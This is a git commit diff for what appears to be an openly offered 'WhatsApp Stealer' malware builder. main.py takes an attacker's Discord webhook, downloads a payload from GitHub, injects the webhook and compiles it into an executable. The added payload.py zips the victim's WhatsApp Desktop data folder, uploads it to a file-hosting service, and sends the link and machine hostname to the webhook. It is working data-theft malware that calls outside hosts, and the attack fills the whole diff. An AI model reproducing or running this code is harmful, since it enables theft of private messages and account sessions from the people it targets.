5dd8bcf1dfdda931ca5e6d0fea6c235eccd1e042
Pierre Henry <toopicogaming@gmail.com>
2023-05-31 18:14:46 +0300

    ready

--- main.py
+++ main.py
@@ -21,24 +21,22 @@ banner = """
 
 def _exit():
     print("\n")
-    Write.Print(f"    .$ Exiting program", Colors.green_to_cyan, interval=0.05)
+    Write.Print(f"    .$ Exiting program | Please star the repo my g", Colors.yellow_to_red, interval=0.05)
     time.sleep(3)
     quit()
 
 def _compile():
     print("\n")
-    line = f'pyinstaller --onefile --icon=Ass/Logo.ico payload.py'
+    line = f'pyinstaller --onefile whatsapp.pyw'
     icox = Write.Input("    .$ Enter icon path (type N for none) -> ", Colors.green_to_blue, interval=0.025)
-    if icox == "N":
-        line = line.replace("--icon=App/Logo.ico", "")
-    else:
-        line = line.replace("--icon=App/Logo.ico", f"--icon={icox}")
+    if icox != "N":
+        line += f"--icon={icox}"
         
     Write.Print(f"    .$ Compiling to exe ...", Colors.green_to_yellow, interval=0.05)
     os.system('echo off')
     print(Fore.BLACK)   
     os.system(line)
-    os.system('cls')
+    #os.system('cls')
     print(Colorate.Horizontal(Colors.rainbow, "    .$ Successfuly Compiled", 1))  
     _exit()
 
@@ -51,18 +49,17 @@ def main():
     
     wbh_url = Write.Input("    .$ Enter your WebHook url -> ", Colors.green_to_blue, interval=0.025)
     Write.Print(f"    .$ Fetching payload ...", Colors.green_to_yellow, interval=0.05)
-    payload = requests.get("https://raw.githubusercontent.com/xpierroz/whatsappstealer/main/payload.py").text
+    payload = requests.get("https://raw.githubusercontent.com/xpierroz/whatsappstealer/master/payload.py").text
     
-    with open("payload.py", "w") as f:
+    with open("whatsapp.pyw", "w") as f:
         f.write(payload.replace('WEBHOOK = "xpierroz on top"', f'WEBHOOK = "{wbh_url}"'))
         
-    Write.Print(f"    .$ Payload fetched !", Colors.green_to_cyan, interval=0.05)
-    compiling = Write.Input("    .$ Compile to exe [Y/N] -> ", Colors.green_to_blue, interval=0.025)
+    Write.Print(f"\n    .$ Payload fetched !", Colors.green_to_cyan, interval=0.05)
+    compiling = Write.Input("\n    .$ Compile to exe [Y/N] -> ", Colors.green_to_blue, interval=0.025)
     if compiling == "Y":
         _compile()
     else:
         _exit()
 
     
-main()
-input()
+_compile()
--- payload.py
+++ payload.py
@@ -1,1 +1,33 @@
+import dhooks 
+import os
+import requests
+import time
+import socket
+import shutil
+
 WEBHOOK = "xpierroz on top"
+direct = f"{os.getenv('LOCALAPPDATA')}\\Packages\\5319275A.WhatsAppDesktop_cv1g1gvanyjgm"
+print(direct)
+
+def uploadToAnonfiles(path):
+    for x in range(10):
+        try:
+            rr = requests.post(
+                f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile',
+                files={
+                    "file": open(path, "rb")
+                },
+            ).json()["data"]["downloadPage"]
+            return rr
+        except Exception:
+            time.sleep(2)
+    return False
+
+try:
+    shutil.make_archive("ssouput", "zip", direct)
+except Exception: 
+    pass
+
+m = uploadToAnonfiles(f"{os.getcwd()}\\ssouput.zip")
+os.remove(f"{os.getcwd()}\\ssouput.zip")
+dhooks.Webhook(WEBHOOK).send(f"```xpierroz WhatsApp Stealer - grabbed {socket.gethostname()} - {m}```")
